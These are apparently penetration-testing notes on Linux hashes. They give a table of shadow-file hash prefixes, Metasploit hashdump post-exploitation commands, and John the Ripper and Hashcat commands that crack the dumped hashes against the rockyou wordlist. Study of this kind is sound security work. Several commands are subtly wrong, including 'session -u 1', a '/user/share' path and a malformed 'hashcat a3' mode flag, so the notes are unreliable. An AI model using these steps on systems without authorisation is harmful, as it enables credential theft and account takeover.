
## Dumping and Cracking Linux Hashes

_The shadow file can give us a clue about the hashing algorithm tha is being use._

_$1 is MD5_

_$2 is Blowfish_

_$5 is SHA-256_

_$6 is SHA-512_

Some distributions use libxcrypt which supports and documents quite a few more methods:

y: yescrypt

gy: gost-yescrypt

7: scrypt

sha1: sha1crypt

md5: SunMD5

Other platforms support other algorithms, so check the crypt manpage there. For example, OpenBSD’s crypt(3) only supports Blowfish, which it identifies using the id “2b”.

Elevated privileges are required for duming linux hashes.

Get hashes after upgrade to a meterpreter session.

```plaintext
session -u 1
sessions
search hashdump
use post/linux/gather/hashdump
show options
set SESSION 2
run
```

**Crack hashes using John the Ripper**

```plaintext
john --format=sha512crypt filepath.txt --wordlist=/user/share/wordlists/rockyou.txt
```

**Crack hashes using Hashcat**

_hashcat modes:_

[_https://hashcat.net/wiki/doku.php?id=example_hashes_](https://hashcat.net/wiki/doku.php?id=example_hashes)

```plaintext
hashcat a3 -m 1800 pathtohash.txt /usr/share/wordlists/rockyou.txt
```


